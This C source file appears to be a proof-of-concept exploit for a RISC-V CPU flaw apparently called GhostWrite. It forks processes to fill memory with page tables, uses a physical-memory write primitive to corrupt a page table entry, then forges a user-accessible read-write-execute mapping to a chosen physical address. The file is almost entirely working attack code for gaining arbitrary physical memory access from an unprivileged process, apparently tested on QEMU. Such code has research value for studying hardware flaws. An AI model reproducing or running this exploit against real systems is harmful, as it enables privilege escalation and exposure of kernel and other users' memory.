#include <stddef.h>
#include <signal.h>
#include <stdint.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <semaphore.h>
#include <stdint.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <elf.h>
#include <time.h>
#include <errno.h>
#include <string.h>

#include "ghostwrite.h"

const uint64_t file_size = 0x1 << 21;
const uint64_t data_page_marker = 0xbaadf00ddeadbeef;

// (gdb) monitor info mtree
// 0000000080000000-00000000ffffffff (prio 0, ram): riscv_virt_board.ram
const uint64_t start_dram  =  0x80000000;
const uint64_t end_dram    = 0x100000000;

const uint64_t vmbase = 0x400000;

const uint64_t child_num = 6;
const uint64_t max_mem_allocated = 0x43000; // tested on qemu ubuntu 22.04

uint64_t fillPageMap(int fd, sem_t* map_finish) {
  uint64_t next = vmbase;
  uint64_t last = -1;
  int error;

  for (uint64_t i = 0;; i++) {
    uint64_t m = (uint64_t)mmap((void*)next, file_size, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED_NOREPLACE, fd, 0);
    error = errno;
    if (m != next) break;
    last = next;
    maccess((void*)next);
    next += file_size;
  }

  // if (error) printf("Error: %s\n", strerror(error));
  printf("Map finished: From 0x%lx to 0x%lx\n", vmbase, last);
  sem_post(map_finish);

  return last;
}

int count_child_num() {
  FILE* fp = fopen("/proc/meminfo", "r");
  char buf[0x80];
  fgets(buf, 0x80, fp);
  fgets(buf, 0x80, fp);
  fgets(buf, 0x80, fp);
  assert(strncmp(buf, "MemAvailable:", 13) == 0);

  uint64_t MemAvailable;
  sscanf(buf+13, "%ld", &MemAvailable);
  printf("MemAvailable: %ld\n", MemAvailable);

  fclose(fp);
  
  uint64_t child_num = MemAvailable / max_mem_allocated;
  return child_num;
}

int main() {
  setbuf(stdout, NULL);
  srand(time(NULL));
  evict_init();

  sem_t* map_finish = (sem_t*) mmap(NULL, sizeof(sem_t), PROT_READ |PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS, -1, 0);
  sem_init(map_finish, 1, 0);

  sem_t* hijack_finish = (sem_t*) mmap(NULL, sizeof(sem_t), PROT_READ |PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS, -1, 0);
  sem_init(hijack_finish, 1, 0);

  sem_t* search_finish = (sem_t*) mmap(NULL, sizeof(sem_t), PROT_READ |PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS, -1, 0);
  sem_init(search_finish, 1, 0);

  sem_t* attack_finish = (sem_t*) mmap(NULL, sizeof(sem_t), PROT_READ |PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS, -1, 0);
  sem_init(attack_finish, 1, 0);

  uint64_t* target = (uint64_t*) mmap(NULL, sizeof(uint64_t), PROT_READ |PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS, -1, 0);
  uint64_t* found = (uint64_t*) mmap(NULL, sizeof(uint64_t), PROT_READ |PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS, -1, 0);
  *found = 0;

  /* ******************************************************* */
  /* * Step 1: Prepare a file in /dev/shm with page marker * */
  /* ******************************************************* */

  const char* filename = "/dev/shm/ghostwriter_blob";
  int fd = open(filename, O_CREAT | O_RDWR, 0666);
  assert(fd != -1);
  int ret = ftruncate(fd, file_size);
  assert(ret != -1);

  uint64_t m = (uint64_t)mmap(NULL, file_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  assert((void*)m != MAP_FAILED);
  for (uint64_t i=0; i<file_size; i+=0x1000) {
    *((uint64_t*)(m+i)) = data_page_marker;
  }
  int res = munmap((void*)m, file_size);
  assert(res >= 0);

  /* ********************************************************** */
  /* * Step 2: fork children to fill the dram with page table * */
  /* ********************************************************** */

  // child_num = count_child_num();
  printf("Child num: %ld\n", child_num);

  for (int child = 0; child < child_num; child++) {
    pid_t pid = fork();
    if (pid == 0) {
      // Fill
      uint64_t last = fillPageMap(fd, map_finish);

      // Search
      sem_wait(hijack_finish);
      if (*found) {
        sem_post(search_finish);
        return 0;
      }
      evict();
      for (uint64_t i = vmbase; i < last; i += 0x1000*512) {
        if (*((uint64_t*)i) != data_page_marker) {
          printf("Found: 0x%lx: 0x%lx\n", i, *((uint64_t*)i));
          *found = i;
          break;
        }
      }
      sem_post(search_finish);

      /* ****************************************************** */
      /* * Step 5: Control the PTE to target Physical Address * */
      /* ****************************************************** */

      uint64_t atk_target = 0x80400000;
      uint64_t atk_PTE = ((atk_target>>12)<<10) | 0x57; // Flag: A U X W R V
      
      write_64(*target, atk_PTE);
      evict();

      printf("Reading 0x%lx: 0x%lx\n", atk_target, *(uint64_t*)(*found));
      // char _c_; scanf("%c", &_c_);

      sem_post(attack_finish);
      return 0;
    }
  }

  for (int i = 0; i < child_num; i++) {
    sem_wait(map_finish);
  }

  /* ******************************************************* */
  /* * Step 3: Overwrite a random address (probably a PTE) * */
  /* ******************************************************* */

  uint64_t two_third_start = start_dram + (end_dram - start_dram) / 3;
  *target = ((rand() % (end_dram - two_third_start + 1)) + two_third_start) & ~0x1fff;
  printf("Enter to overwrite target: 0x%lx\n", *target);
  char _c_; scanf("%c", &_c_);

  write_8(*target+1, 0); // 2bits RSW 6bits PPN[0]

  /* *********************************************** */
  /* * Step 4: Try to find a modified page mapping * */
  /* *********************************************** */

  for (int i = 0; i < child_num; i++) {
    sem_post(hijack_finish);
    sem_wait(search_finish);
    sleep(1);
  }

  if (*found == 0) {
    printf("Failed to find the target\n");
    goto main_end;
  }

  sem_wait(attack_finish);

main_end:
  printf("done\n");
  kill(0, SIGKILL);
  return 0;
}
